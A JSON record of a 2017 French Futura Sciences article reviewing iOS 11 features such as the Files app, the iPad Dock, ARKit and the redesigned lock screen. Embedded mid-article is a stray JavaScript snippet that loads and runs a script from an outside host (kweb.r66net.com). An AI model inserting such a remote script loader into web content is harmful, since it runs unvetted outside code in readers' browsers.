{"title": "iOS 11 : les principales nouveautés d'Apple", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "20/09/2017", "content": "La dernière mise à jour du système d'exploitation iOS d'Apple introduit de nombreuses nouveautés, dont certaines renouvellent l'utilisation de la tablette iPad. L'iPhone, de son côté, gagne en ergonomie et en praticité. Les détails. Ce qu'il faut retenir iOS 11 est disponible pour les iPhone et iPad compatibles. Le nouvel OS d'Apple s'ouvre aux applications de réalité augmentée. Des évolutions importantes viennent étoffer les fonctionnalités, notamment sur l'iPad. iOS  11 est disponible à partir de l' iPhone  5S et sur tous les modèles suivants. En ce qui concerne l' iPad , sont éligibles les iPad de 2017, l'iPad  Air , Air 2, l'iPad Pro (9,7, 10,5 et 12,9 pouces) ainsi que les iPad mini 2, 3 et 4 et l' iPod  touch de sixième génération. Voici les nouveautés les plus marquantes qu'apporte iOS à ces  smartphones  et tablettes.  Un centre de contrôle personnalisable La nouvelle mouture du centre de contrôle d'iOS présente les fonctions sous forme d' icônes  individuelles. Il offre surtout des options de personnalisation avec la possibilité d'ajouter des commandes. Pour cela, il faut se rendre dans Réglages > Centre de contrôle > Personnaliser les commandes. Dommage que l'on ne puisse pas ajouter des raccourcis vers des  applications  tierces. Le centre de contrôle d’iOS 11. © Apple                        Un Finder pour iOS Avec l'application Fichiers,  l’iPhone  et l'iPad disposent désormais d'un équivalent du Finder sur macOS. L'outil permet de chercher, parcourir et classer tous les types de fichiers ; il recense également les contenus récents. L'application fonctionne aussi bien pour les fichiers stockés dans la mémoire du terminal que pour ceux présents sur des services de stockage en ligne tels que iCloud, Box ou Dropbox. L’application Fichiers d’iOS 11 rend la gestion des fichiers beaucoup plus pratique. © Apple                                Un nouveau Dock et le glisser-déposer pour l’iPad C'est certainement l'iPad qui bénéficie le plus des nouveautés d'iOS 11. Le nouveau Dock s'affiche sur n'importe quel écran avec un geste de balayage ; on peut y ajouter les applications de son choix. L'autre grande amélioration concerne l'arrivée du glisser-déposer pour déplacer du texte, des images, des fichiers entre les applications. Cela s'accompagne d'un mode multitâche grâce auquel on peut ouvrir deux applications côte à côte dans Slide Over ou Split View. Le Dock de l’iPad gère le multitâche et le glisser-déposer. © Apple                                L’application Notes encore plus complète Notes s'enrichit de plusieurs fonctionnalités importantes. Il est ainsi possible de faire une recherche de notes manuscrites scannées ou rédigées avec le stylet  Apple  Pencil. L'application permet aussi désormais de numériser des documents et d'ajouter des tableaux. Autant d'améliorations qui en font une alternative crédible à Evernote.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un App Store remanié La boutique d'applications a eu droit à un profond remaniement pour gagner en clarté. Désormais, les jeux sont classés à part dans un onglet dédié. La recommandation de contenu est éditorialisée avec des chroniques et la mise en avant d'une nouvelle application quotidienne.  Le nouvel App Store distingue désormais les applications des jeux. © Apple                        La réalité augmentée avec ARKit La  réalité augmentée  fait une arrivée en force chez  Apple  avec l'introduction d'ARKit. Ce n'est pas directement une nouveauté d'iOS 11, mais un kit de développement grâce auquel les créateurs d'applications peuvent exploiter cette technologie d'affichage qui superpose des informations à l'environnement réel. Les terminaux sous iOS 11 et dotés d'un  processeur  A9 pourront exécuter des applications de réalité augmentée. Parmi les premiers contenus disponibles,  MeasureKit  est l'un des plus impressionnants. Cette application permet de prendre les mesures d'une pièce ou d'un objet avec de très nombreuses options.  La réalité augmentée grâce à ARKit. © Apple                       De nouvelles options pour Live Photos Live Photos reçoit trois nouvelles options pour créer des animations à partir d'images : rebond (une action revient à son point de départ), boucle vidéo et pose longue pour créer un effet de traînée. Par ailleurs, on peut désormais couper le son, changer d'image clé et raccourcir une séquence.  L’application Live Photos d’iOS 11. © Apple                        Le centre de notifications intégré à l’écran de verrouillage  Grosse évolution ergonomique au niveau du centre de notifications qui se retrouve intégré à l'écran de verrouillage. Le panneau de notifications a fusionné avec l’écran de verrouillage. © Apple                       Pour consulter les notifications, il faut ouvrir le panneau en tirant avec le doigt depuis le haut de l'écran. Un fonctionnement qui s'apparente à ce que l'on trouve sur  Android . ", "theme": "tech"}